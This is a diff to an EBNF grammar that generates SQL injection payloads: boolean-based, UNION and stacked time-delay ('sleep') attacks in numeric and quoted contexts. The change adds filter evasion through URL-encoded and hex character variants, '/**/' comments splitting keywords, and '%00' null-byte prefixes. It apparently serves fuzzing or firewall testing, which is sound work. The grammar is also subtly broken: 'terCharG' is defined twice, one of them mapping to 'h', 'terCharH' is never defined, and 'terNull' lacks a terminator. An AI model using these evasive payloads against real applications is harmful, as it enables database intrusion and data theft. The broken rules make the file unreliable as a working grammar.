@@ -1,45 +1,82 @@
-terOne = "1" ;
-terSQuote = "'" ;
-terDQuote = "\"" ;
-terDigitZero = "0" ;
-terDigitOne = "1" ;
-terDigitExcludingZero = terDigitOne | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9" ;
+terSQuote = "'" | "%27" ;
+terDQuote = "\"" | "%22" ;
+terDigitZero = "0" | "%30" ;
+terDigitOne = "1" | "%31" ;
+terDigitTwo = "2" | "%32" ;
+terDigitThree = "3" | "%33" ;
+terDigitFour = "4" | "%34" ;
+terDigitFive = "5" | "%35" ;
+terDigitSix = "6" | "%36" ;
+terDigitSeven = "7" | "%37" ;
+terDigitEight = "8" | "%38" ;
+terDigitNine = "9" | "%39" ;
+terDigitExcludingZero = terDigitOne | terDigitTwo | terDigitThree | terDigitFour | terDigitFive | terDigitSix | terDigitSeven | terDigitEight | terDigitNine ;
 terDigitIncludingZero = terDigitZero | terDigitExcludingZero ;
-terChar = "a" ;
+terCharA = "a" | "0x61" | "%61" ;
+terCharB = "b" | "0x62" | "%62" ;
+terCharC = "c" | "0x63" | "%63" ;
+terCharD = "d" | "0x64" | "%64" ;
+terCharE = "e" | "0x65" | "%65" ;
+terCharF = "f" | "0x66" | "%66" ;
+terCharG = "g" | "0x67" | "%67" ;
+terCharG = "h" | "0x68" | "%68" ;
+terCharI = "i" | "0x69" | "%69" ;
+terCharJ = "j" | "0x6A" | "%6A" ;
+terCharK = "k" | "0x6B" | "%6B" ;
+terCharL = "l" | "0x6C" | "%6C" ;
+terCharM = "m" | "0x6D" | "%6D" ;
+terCharN = "n" | "0x6E" | "%6E" ;
+terCharO = "o" | "0x6F" | "%6F" ;
+terCharP = "p" | "0x70" | "%70" ;
+terCharQ = "q" | "0x71" | "%71" ;
+terCharR = "r" | "0x72" | "%72" ;
+terCharS = "s" | "0x73" | "%73" ;
+terCharT = "t" | "0x74" | "%74" ;
+terCharU = "u" | "0x75" | "%75" ;
+terCharV = "v" | "0x76" | "%76" ;
+terCharW = "w" | "0x77" | "%77" ;
+terCharX = "x" | "0x78" | "%78" ;
+terCharY = "y" | "0x79" | "%79" ;
+terCharZ = "z" | "0x7A" | "%7A" ;
+terChar = terCharA | terCharB | terCharC | terCharD | terCharE | terCharF | terCharG | terCharH | terCharI | terCharJ | terCharK | terCharL | terCharM | terCharN | terCharO | terCharP | terCharQ | terCharR | terCharS | terCharT | terCharU | terCharV | terCharW | terCharX | terCharY | terCharZ ;
+terCharNoQuote = opChar, parOpen, "97", par | "0x61" ; 
+terNull = "%00"
 
 # SQL Operators and Keyword
-opNot = "!" | "not" ;
-opBinInvert = "~" ;
-opEqual = "=" ;
-opLt = "<" ;
-opGt = ">" ;
-opLike = "like" ;
-opIs = "is" ;
-opMinus = "-" ;
-opOr = "or" | "||" ;
-opAnd = "and" | "&&" ;
-opSel = "select" ;
-opUni = "union" ;
-opSem = ";" ;
+opNot = "!" | "%21" | terCharN, [inlineCmt], terCharO, [inlineCmt], terCharT ;
+opBinInvert = "~" | "%7E" ;
+opEqual = "=" | "%3D" ;
+opLt = "<" | "%3C" ;
+opGt = ">" | "%3E" ;
+opLike = terCharL, [inlineCmt], terCharI, [inlineCmt], terCharK, [inlineCmt], terCharE ;
+opIs = terCharI, [inlineCmt], terCharS ;
+opMinus = "-" | "%2D";
+opOr = terCharO, [inlineCmt], terCharR | "||" | "%7C%7C";
+opAnd = terCharA, [inlineCmt], terCharN, [inlineCmt], terCharD | "&&" | "%26%26";
+opSel = terCharS, [inlineCmt], terCharE, [inlineCmt], terCharL, [inlineCmt], terCharE, [inlineCmt], terCharC, [inlineCmt], terCharT ;
+opUni = terCharU, [inlineCmt], terCharN, [inlineCmt], terCharI, [inlineCmt], terCharO, [inlineCmt], terCharN ;
+opSem = ";" | "%3B" ;
+opConcat = "concat" ;
+opChar = "char" ;
 
 # SQL functions
-parOpen = "(" ;
+parOpen = "(" | "%28" ;
 funcSleep = "sleep" , parOpen , terDigitExcludingZero , par ;
 
 # Syntax-repairing
-par = ")" ;
-cmt = "#" | "--", blank
+par = ")" | "%29" ;
+cmt = "#" | "--", blank | "%23"
 
 # Obfuscation
 inlineCmt = "/**/" ;
-blank = " " ;
+blank = " " | "%20" ;
 wsp = blank | inlineCmt ;
 
 ### Boolean-based Attacks ### 
 
 # boolean values which evaluate to true
-# trueConst = "true" | "tr" , [inlineCmt] , "ue" ;
-trueConst = "true" ; 
+trueConst = terCharT, [inlineCmt], terCharR, [inlineCmt], terCharU, [inlineCmt], terCharE ;
+# trueConst = "true" ; 
 trueAtom = trueConst | terDigitOne ;
 unaryTrue = wsp, trueAtom | wsp, opNot, wsp, falseAtom | opBinInvert, wsp, falseAtom | wsp, opNot, wsp, opBinInvert, trueAtom ;
 bT1 = unaryTrue, opEqual, wsp, parOpen, unaryTrue, par ;
@@ -56,8 +93,8 @@ binaryTrue = bT1 | bT2 | bT3 | bT4 | bT5 | bT6 | bT7 | bT8 | bT9 | bT10 ;
 booleanTrueExpr = unaryTrue | binaryTrue ;
 
 # boolean values which evaluate to false
-# falseConst = "false" | "fa" , [inlineCmt] , "lse" ;
-falseConst = "false" ;
+falseConst = terCharF, [inlineCmt], terCharA, [inlineCmt], terCharL, [inlineCmt], terCharS, [inlineCmt], terCharE ;
+# falseConst = "false" ;
 falseAtom = wsp, falseConst |  wsp, terDigitZero | terSQuote, terSQuote ;
 unaryFalse = falseAtom | wsp, opNot, wsp, trueAtom | wsp, opNot, opBinInvert, falseAtom | wsp, opBinInvert, trueAtom ;
 booleanFalseExpr = unaryFalse ;
@@ -78,8 +115,8 @@ piggyAttack = opSem, opSel, wsp, funcSleep ;
 ### Injection Context ###
 sqliAttack = unionAttack | piggyAttack | booleanAttack ;
 
-numericContext = terDigitZero, wsp, booleanAttack, wsp | terDigitZero, par, wsp, booleanAttack, wsp, opOr, parOpen, terDigitZero | terDigitZero, [par], wsp, sqliAttack, cmt ;
-sQuoteContext = terSQuote, wsp, booleanAttack, wsp, opOr, terSQuote | terSQuote, par, wsp, booleanAttack, wsp, opOr, parOpen, terSQuote | terSQuote, [par], wsp, sqliAttack, cmt ;
-dQuoteContext = terDQuote, wsp, booleanAttack, wsp, opOr, terDQuote | terDQuote, par, wsp, booleanAttack, wsp, opOr, parOpen, terDQuote | terDQuote, [par], wsp, sqliAttack, cmt ;
+numericContext = [terNull], terDigitZero, wsp, booleanAttack, wsp | [terNull], terDigitZero, par, wsp, booleanAttack, wsp, opOr, parOpen, terDigitZero | [terNull], terDigitZero, [par], wsp, sqliAttack, cmt ;
+sQuoteContext = [terNull], terSQuote, wsp, booleanAttack, wsp, opOr, terSQuote | [terNull], terSQuote, par, wsp, booleanAttack, wsp, opOr, parOpen, terSQuote | [terNull], terSQuote, [par], wsp, sqliAttack, cmt ;
+dQuoteContext = [terNull], terDQuote, wsp, booleanAttack, wsp, opOr, terDQuote | [terNull], terDQuote, par, wsp, booleanAttack, wsp, opOr, parOpen, terDQuote | [terNull], terDQuote, [par], wsp, sqliAttack, cmt ;
 
 start = numericContext | sQuoteContext | dQuoteContext ;
